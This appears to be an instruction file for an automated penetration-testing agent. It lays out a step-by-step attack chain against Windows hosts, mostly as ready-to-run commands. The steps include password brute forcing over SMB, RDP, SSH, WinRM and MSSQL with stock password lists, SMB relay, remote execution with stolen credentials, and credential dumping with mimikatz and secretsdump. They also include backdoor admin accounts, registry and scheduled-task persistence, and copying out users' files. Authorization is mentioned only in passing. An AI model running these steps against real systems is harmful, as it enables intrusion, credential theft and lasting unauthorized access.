# Windows Full-Chain Pentest

## Overview
Complete methodology for penetrating Windows hosts from zero to SYSTEM.
**CRITICAL RULE:** Do NOT start with HTTP/web attacks on Windows. Start with credential
and protocol attacks (SMB, RDP, SSH, WinRM). Web is LAST resort.

## Decision Tree: Attack Priority

```
WINDOWS TARGET DETECTED
│
├── Phase 1: RECON (5 iterations max)
│   ├── nmap -Pn -sV -sC -p- --top-ports 1000 TARGET
│   ├── Identify: SMB version, signing, OS build, hostname
│   ├── Check: SMB signing disabled? → RELAY ATTACKS
│   └── Note ALL open ports, don't fixate on just HTTP
│
├── Phase 2: CREDENTIAL ATTACKS (priority #1, 30-50 iterations)
│   ├── SMB Brute Force (445)
│   │   ├── crackmapexec smb TARGET -u users.txt -p passwords.txt --no-bruteforce
│   │   ├── crackmapexec smb TARGET -u Administrator -p COMMON_PASSWORDS
│   │   ├── crackmapexec smb TARGET -u admin -p COMMON_PASSWORDS
│   │   └── If creds found → SKIP TO Phase 4
│   │
│   ├── RDP Brute Force (3389)
│   │   ├── hydra -L users.txt -P passwords.txt rdp://TARGET -t 4
│   │   ├── crowbar -b rdp -s TARGET/32 -u admin -C passwords.txt
│   │   └── If creds found → SKIP TO Phase 4
│   │
│   ├── SSH Brute Force (22)
│   │   ├── hydra -L users.txt -P passwords.txt ssh://TARGET -t 4
│   │   └── If creds found → SKIP TO Phase 4
│   │
│   ├── WinRM Brute Force (5985/5986)
│   │   ├── crackmapexec winrm TARGET -u users.txt -p passwords.txt
│   │   └── If creds found → SKIP TO Phase 4
│   │
│   └── MSSQL Brute Force (1433)
│       ├── crackmapexec mssql TARGET -u sa -p COMMON_PASSWORDS
│       ├── hydra -l sa -P passwords.txt mssql://TARGET
│       └── If creds found → xp_cmdshell for shell
│
├── Phase 3: VULNERABILITY EXPLOITATION (if no creds found)
│   ├── CVE Checks
│   │   ├── nmap --script smb-vuln-* TARGET
│   │   ├── nmap --script rdp-vuln-* TARGET  
│   │   ├── Check EternalBlue: nmap -p445 --script smb-vuln-ms17-010 TARGET
│   │   ├── Check BlueKeep: nmap -p3389 --script rdp-vuln-0708 TARGET
│   │   ├── Check PrintNightmare, ZeroLogon, PetitPotam
│   │   └── searchsploit "Windows 11" OR "IIS 10.0" OR service versions
│   │
│   ├── SMB Relay (if signing disabled)
│   │   ├── responder -I eth0 -dwP
│   │   ├── ntlmrelayx.py -tf targets.txt -smb2support
│   │   └── Capture NetNTLM hashes → crack with hashcat/john
│   │
│   └── Web Exploitation (LAST RESORT)
│       ├── Only if ports 80/443 serve a real web app (not default IIS)
│       ├── gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
│       ├── nikto -h http://TARGET
│       └── STOP if all endpoints return 404/403 — web is a dead end
│
├── Phase 4: ACCESS WITH CREDENTIALS
│   ├── Test credential access methods (in order):
│   │   ├── evil-winrm -i TARGET -u USER -p PASS
│   │   ├── impacket-psexec USER:PASS@TARGET
│   │   ├── impacket-wmiexec USER:PASS@TARGET
│   │   ├── impacket-smbexec USER:PASS@TARGET
│   │   ├── ssh USER@TARGET (if SSH open)
│   │   ├── xfreerdp /v:TARGET /u:USER /p:PASS (if RDP open)
│   │   └── crackmapexec smb TARGET -u USER -p PASS -x "whoami"
│   │
│   ├── Verify access:
│   │   ├── whoami /all
│   │   ├── hostname
│   │   ├── ipconfig /all
│   │   ├── net user
│   │   └── systeminfo
│   │
│   └── SAVE PROOF: redirect all output to evidence files
│
├── Phase 5: PRIVILEGE ESCALATION
│   ├── Check current privileges:
│   │   ├── whoami /priv
│   │   ├── net localgroup Administrators
│   │   └── Already SYSTEM/Admin? → Skip to Phase 6
│   │
│   ├── Token Privileges:
│   │   ├── SeImpersonatePrivilege → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato)
│   │   ├── SeBackupPrivilege → SAM/SYSTEM extraction
│   │   ├── SeDebugPrivilege → LSASS dump
│   │   └── SeLoadDriverPrivilege → Driver exploit
│   │
│   ├── Misconfigurations:
│   │   ├── Unquoted service paths: wmic service get name,pathname,startmode
│   │   ├── Weak service permissions: accesschk.exe -uwcqv "Everyone" *
│   │   ├── AlwaysInstallElevated: reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
│   │   ├── Scheduled tasks: schtasks /query /fo LIST /v
│   │   └── Stored credentials: cmdkey /list
│   │
│   ├── Credential Dumping:
│   │   ├── reg save HKLM\SAM sam.hiv && reg save HKLM\SYSTEM system.hiv
│   │   ├── impacket-secretsdump USER:PASS@TARGET
│   │   ├── mimikatz: sekurlsa::logonpasswords
│   │   └── Crack NTLM hashes: hashcat -m 1000 hashes.txt rockyou.txt
│   │
│   └── Kernel Exploits (last resort):
│       ├── systeminfo → windows-exploit-suggester
│       └── Search for matching CVE exploits
│
├── Phase 6: PERSISTENCE (if allowed)
│   ├── Create backdoor user: net user hacker P@ssw0rd123! /add && net localgroup Administrators hacker /add
│   ├── Enable RDP: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
│   ├── Scheduled task: schtasks /create /tn "Update" /tr "cmd /c ..." /sc onlogon /ru SYSTEM
│   └── Registry run key: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Update /d "cmd.exe /c ..."
│
└── Phase 7: EXFILTRATION (proof)
    ├── Extract sensitive files:
    │   ├── type C:\Users\*\Desktop\*.txt
    │   ├── dir /s /b C:\Users\*\Documents\*.docx
    │   ├── reg save HKLM\SAM evidence\sam.hiv
    │   └── Copy any database files, configs, or secrets
    ├── Network info: ipconfig /all, arp -a, netstat -an, route print
    └── Save ALL evidence to output directory
```

## Common Windows Credential Lists

### Usernames (try ALL of these)
```
Administrator
admin
user
guest
test
svc_admin
backup
sql_svc
mssql
iis_user
webadmin
```

### Passwords (try ALL of these against each user)
```
Password1
P@ssw0rd
Password123
Admin123
Welcome1
Passw0rd!
P@ssw0rd!
Summer2026
Winter2026
Company123
qwerty123
```

### Quick Credential File Setup
```bash
# Create wordlists in output dir
cat > $OUT/users.txt << 'EOF'
Administrator
admin
user
guest
test
svc_admin
backup
sql_svc
webadmin
EOF

cat > $OUT/passwords.txt << 'EOF'
Password1
P@ssw0rd
Password123
Admin123
Welcome1
Passw0rd!
P@ssw0rd!
admin
password
123456
Summer2026
Winter2026
Company123
letmein
changeme
EOF
```

## Critical Anti-Patterns (DO NOT DO)

1. **DO NOT** spend more than 10 iterations on HTTP if IIS returns default pages or 404s
2. **DO NOT** chase robots.txt entries — they are often honeypots
3. **DO NOT** assume `/debug.aspx` or `/admin/` exist on default IIS
4. **DO NOT** keep trying command injection on IIS without proof it's vulnerable
5. **DO NOT** ignore SMB, RDP, SSH in favor of HTTP
6. **DO NOT** run the same curl command with different payloads 20+ times
7. **DO NOT** confuse your own Kali shell output (uid=0) with target exploitation

## Evidence Requirements

Every exploitation claim MUST include:
- The EXACT command that produced the result
- Output showing TARGET hostname/IP (not Kali)
- For shell access: `whoami` + `hostname` output from the TARGET
- For credential access: actual credential pair that works
- For data exfil: actual file contents from the TARGET

## Tool Quick Reference

| Attack | Tool | Command |
|--------|------|---------|
| SMB brute | crackmapexec | `crackmapexec smb TARGET -u users.txt -p passwords.txt` |
| SMB exec | psexec | `impacket-psexec USER:PASS@TARGET` |
| SMB exec | wmiexec | `impacket-wmiexec USER:PASS@TARGET` |
| SMB enum | enum4linux-ng | `enum4linux-ng -A TARGET` |
| SMB shares | smbmap | `smbmap -H TARGET -u USER -p PASS` |
| SMB vuln | nmap | `nmap --script smb-vuln-* -p445 TARGET` |
| RDP brute | hydra | `hydra -L users.txt -P passwords.txt rdp://TARGET -t 4` |
| RDP connect | xfreerdp | `xfreerdp /v:TARGET /u:USER /p:PASS /cert:ignore` |
| SSH brute | hydra | `hydra -L users.txt -P passwords.txt ssh://TARGET -t 4` |
| WinRM shell | evil-winrm | `evil-winrm -i TARGET -u USER -p PASS` |
| WinRM brute | crackmapexec | `crackmapexec winrm TARGET -u users.txt -p passwords.txt` |
| MSSQL | impacket | `impacket-mssqlclient USER:PASS@TARGET` |
| Hash dump | secretsdump | `impacket-secretsdump USER:PASS@TARGET` |
| Pass-the-hash | psexec | `impacket-psexec -hashes :NTHASH admin@TARGET` |
| Relay | ntlmrelayx | `ntlmrelayx.py -tf targets.txt -smb2support` |
| Kerberoast | GetUserSPNs | `impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip TARGET` |

## Deep Dives
Load references when needed:
1. SMB attack chains: `references/smb_attacks.md`
2. Privilege escalation: `references/privesc.md`
3. Post-exploitation: `references/post_exploit.md`
